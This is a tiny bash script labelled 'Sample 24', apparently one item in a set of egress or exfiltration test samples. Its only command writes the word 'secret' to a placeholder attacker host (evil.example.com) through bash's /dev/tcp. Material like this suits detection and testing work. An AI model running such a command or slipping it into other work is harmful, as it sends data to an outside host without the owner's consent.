#!/usr/bin/env bash
# Sample 24: bash /dev/tcp egress.
echo secret > /dev/tcp/evil.example.com/443
